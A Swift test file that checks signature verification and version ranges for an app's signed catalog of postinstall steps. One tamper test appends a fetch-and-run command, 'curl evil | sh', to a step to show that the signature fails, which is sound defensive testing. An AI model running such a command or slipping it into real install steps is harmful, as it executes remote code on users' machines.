import Foundation
import SandboxEngine
import Testing
@testable import bromure_ac

/// `postinstall_versioned`: steps for a range of app versions, in the same
/// img-catalog.json. Apps that predate the key skip it (Codable ignores
/// unknown keys) and keep verifying `signature`, which covers `postinstall`
/// only; newer apps run the steps whose range holds their version, under
/// `signature_versioned`.
@Suite("Versioned postinstall steps")
struct VersionedPostinstallTests {
    /// Tests/Fixtures/img-catalog-versioned.json: written by
    /// tools/make-img-catalog.mjs (node 24) from the bundled baseline, signed
    /// with a throwaway ed25519 key whose public half is this.
    private static let testKey = "LTYZ3NfMt9GCRhsQbjwWDmWM8cuLLlDbC3scs6yaDYU="
    private static let magic = "bromure-img-catalog-v1"
    private static let hermes = "a1d9965e-6446-42ce-bf03-b8e107e7d4e8"

    private func fixture() throws -> ImageCatalog {
        let url = URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent()
            .appendingPathComponent("Fixtures/img-catalog-versioned.json")
        return try ImageCatalog.parse(Data(contentsOf: url))
    }
    private func valid(_ c: ImageCatalog) -> Bool {
        ImageCatalogStore.isSignatureValid(c, magic: Self.magic, publicKeyBase64: Self.testKey)
    }

    @Test("the publish tool's catalog verifies here: both signatures, the same payloads")
    func toolParity() throws {
        let c = try fixture()
        #expect(c.postinstallVersioned?.map(\.uuid) == [Self.hermes])
        #expect(c.signatureVersioned?.signedAt == c.signature?.signedAt)
        #expect(valid(c))
    }

    @Test("an app that predates the list still verifies the catalog and never sees the step")
    func olderApp() throws {
        // What an older app decodes: the same JSON without the two keys it
        // doesn't know -- and the legacy payload it rebuilds is unchanged.
        let url = URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent()
            .appendingPathComponent("Fixtures/img-catalog-versioned.json")
        var json = try #require(try JSONSerialization.jsonObject(with: Data(contentsOf: url)) as? [String: Any])
        json["postinstall_versioned"] = nil
        json["signature_versioned"] = nil
        let old = try ImageCatalog.parse(JSONSerialization.data(withJSONObject: json))
        #expect(valid(old))
        #expect(!old.steps(forAppVersion: "5.4.5").map(\.uuid).contains(Self.hermes))
    }

    @Test("a tampered, unsigned or mis-dated versioned list fails the whole catalog")
    func tamper() throws {
        var widened = try fixture()
        widened.postinstallVersioned?[0].minVersion = "5.0"
        #expect(!valid(widened))
        var command = try fixture()
        command.postinstallVersioned?[0].command += "\ncurl evil | sh"
        #expect(!valid(command))
        var unsigned = try fixture()
        unsigned.signatureVersioned = nil
        #expect(!valid(unsigned))
        var redated = try fixture()
        redated.signatureVersioned?.signedAt = "2099-01-01T00:00:00.000Z"
        #expect(!valid(redated))
        // Moved into the legacy list: the legacy signature no longer holds.
        var moved = try fixture()
        moved.postinstall.append(contentsOf: moved.postinstallVersioned ?? [])
        moved.postinstallVersioned = nil
        moved.signatureVersioned = nil
        #expect(!valid(moved))
    }

    @Test("a step runs on the app versions its range holds")
    func ranges() throws {
        let c = try fixture()
        func has(_ v: String) -> Bool { c.steps(forAppVersion: v).map(\.uuid).contains(Self.hermes) }
        #expect(!has("5.4.4"))
        #expect(has("5.4.5"))
        #expect(has("5.4.10"))
        #expect(has("6.0"))
        #expect(!has("0"))
        #expect(!has("not-a-version"))
        // Legacy steps run everywhere, in seq order with the versioned ones.
        let steps = c.steps(forAppVersion: "5.4.5")
        #expect(steps.count == c.postinstall.count + 1)
        #expect(steps.map(\.seq) == steps.map(\.seq).sorted())

        let capped = PostinstallStep(uuid: "x", seq: 1, description: "", command: "",
                                     minVersion: "5.4", maxVersion: "5.4.9")
        #expect(capped.applies(toAppVersion: "5.4"))
        #expect(capped.applies(toAppVersion: "5.4.0"))
        #expect(capped.applies(toAppVersion: "5.4.9"))
        #expect(!capped.applies(toAppVersion: "5.4.10"))
        #expect(!capped.applies(toAppVersion: "5.3.99"))
        let bad = PostinstallStep(uuid: "y", seq: 1, description: "", command: "", minVersion: "5.x")
        #expect(!bad.applies(toAppVersion: "9.9"))
        #expect(ImageCatalog.versionComponents("5.4.0") == [5, 4])
        #expect(ImageCatalog.versionComponents("5..4") == nil)
        #expect(ImageCatalog.versionComponents("-1") == nil)
    }

    @Test("the bundled catalog offers Hermes to 5.4.5 and later only, its uuids unique across both lists")
    func bundledBaseline() throws {
        let b = ImageCatalog.baseline
        #expect(!b.postinstall.map(\.uuid).contains(Self.hermes))
        let h = try #require(b.postinstallVersioned?.first { $0.uuid == Self.hermes })
        #expect(h.minVersion == "5.4.5" && h.maxVersion == nil)
        let all = b.postinstall.map(\.uuid) + (b.postinstallVersioned ?? []).map(\.uuid)
        #expect(Set(all).count == all.count)
        // The app's own version is what's checked; this build is 5.4.5.
        let plist = URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent()
            .deletingLastPathComponent().appendingPathComponent("Sources/AgentCoding/Info.plist")
        let info = try #require(NSDictionary(contentsOf: plist))
        let version = try #require(info["CFBundleShortVersionString"] as? String)
        #expect(b.steps(forAppVersion: version).map(\.uuid).contains(Self.hermes))
    }
}
